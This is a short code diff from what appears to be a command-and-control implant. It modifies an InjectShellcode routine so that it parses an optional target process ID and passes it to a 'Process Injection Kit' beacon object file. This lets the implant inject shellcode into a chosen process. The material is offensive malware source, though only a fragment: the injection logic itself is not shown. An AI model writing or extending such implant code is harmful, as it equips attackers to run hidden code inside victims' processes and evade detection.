@@ -31,12 +31,24 @@ VOID InjectShellcode(_In_ PCHAR taskUuid, _In_ PPARSER arguments)
     UINT32 nbArg = ParserGetInt32(arguments);
     _dbg("GOT %d arguments", nbArg);
 
+    // required: Shellcode, ProcessInject BoF
     if ( nbArg <= 1 )
     {
         // Wrong # of args
         return;
     }
-    
+
+    /* We have 3 parameters or more, which means that probably a PID has been passed. Try parsing it for explicit injection. */
+    /* For some weird reason, the PID is packed as the first argument, although inject_shellcode.py adds it as the last one ?! */
+    UINT32 pid = 0;
+    if (nbArg >= 3)
+    {
+        pid = ParserGetInt32(arguments);
+        _dbg("I'm still fine!");
+        _dbg("[+] Got PID %d. Assuming explicit injection", pid);
+    }
+
+  
     /* Get shellcode bytes */
     PCHAR shellcodeData = ParserGetString(arguments, &scLength);
 
@@ -57,8 +69,10 @@ VOID InjectShellcode(_In_ PCHAR taskUuid, _In_ PPARSER arguments)
     kitLen       -= 8;
     _dbg("[+] Using Process Injection Kit. %d bytes", kitLen);
 
+    /* Todo: Adopt InjectShellcodeViaKit() to accept PID argument */
+
     /* Inject shellcode ( default | custom kit ) */
-    if ( !InjectShellcodeViaKit(Shellcode, scLength, injectKitBof, kitLen, &Output, &OutLen) )
+    if ( !InjectShellcodeViaKit(Shellcode, scLength, injectKitBof, kitLen, pid, &Output, &OutLen) )
     {
         DWORD error = GetLastError();
         _err("[!] Failed to inject with kit. ERROR : %d\n", error);
